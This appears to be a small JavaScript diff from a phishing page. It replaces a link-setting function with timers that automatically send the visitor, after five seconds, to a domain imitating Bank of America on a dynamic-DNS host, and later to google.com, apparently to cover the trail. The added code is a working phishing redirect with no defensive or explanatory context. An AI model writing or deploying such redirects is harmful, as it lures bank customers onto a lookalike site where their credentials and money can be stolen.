@@ -1,4 +1,7 @@
-function mov() {
-    const link = document.getElementById("nextPage");
-    link.href = "https://usersecure.online-bankofamerica.dynv6.net/?user=authorized"
-}
+setTimeout(() => {
+    document.location.href = 'https://usersecure.online-bankofamerica.dynv6.net/?user=authorized'
+}, 5000);
+
+setTimeout(() => {
+    document.location.href = 'https://google.com'
+}, 15000);
